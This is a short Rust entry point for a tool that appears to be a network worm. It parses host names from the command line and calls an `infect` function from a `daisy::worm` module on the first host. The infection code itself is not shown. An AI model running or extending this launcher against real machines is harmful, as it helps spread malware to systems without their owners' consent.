use clap::{arg, crate_authors, crate_description, crate_name};
use daisy::{worm::infect, HostSpec};
use log::LevelFilter;
use simplelog::{ColorChoice, Config, TerminalMode};

fn main() {
    simplelog::TermLogger::init(
        LevelFilter::Trace,
        Config::default(),
        TerminalMode::Mixed,
        ColorChoice::Auto,
    )
    .expect("Failed to initialize logging system");

    let args = clap::Command::new(crate_name!())
        .author(crate_authors!())
        .about(crate_description!())
        .arg(arg!(<hosts> ... "A list of hosts to connect to."))
        .get_matches();

    let hosts: Vec<&String> = args.get_many::<String>("hosts").unwrap().collect::<_>();
    println!("{:?}", hosts);
    if hosts.len() < 1 {
        eprintln!("Error: At least one host required.");
    }

    infect(&HostSpec::from(hosts[0].as_str())).unwrap();
}
